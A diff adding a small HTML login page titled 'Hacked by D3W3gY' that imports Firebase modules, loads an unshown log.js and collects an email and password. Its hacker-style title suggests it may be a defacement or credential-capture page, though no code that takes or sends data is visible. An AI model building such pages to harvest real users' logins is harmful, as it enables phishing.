@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Hacked by D3W3gY</title>
+
+  <script src="log.js"></script>
+</head>
+<script type="module">
+  import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js'
+
+  // If you enabled Analytics in your project, add the Firebase SDK for Google Analytics
+  import { getAnalytics } from 'https://www.gstatic.com/firebasejs/10.9.0/firebase-analytics.js'
+
+  // Add Firebase products that you want to use
+  import { getAuth } from 'https://www.gstatic.com/firebasejs/10.9.0/firebase-auth.js'
+  import { getFirestore } from 'https://www.gstatic.com/firebasejs/10.9.0/firebase-firestore.js'
+</script>
+
+<script type="module" src="log.js" defer></script>
+
+<h2>Login Form</h2>
+<div>
+  <label for="email">Email:</label>
+  <input type="email" id="email" name="email">
+</div>
+<div>
+  <label for="password">Password:</label>
+  <input type="password" id="password" name="password">
+</div>
+<button onclick="login()" id="submit">Login</button>
+
+
+</body>
+
+</html>
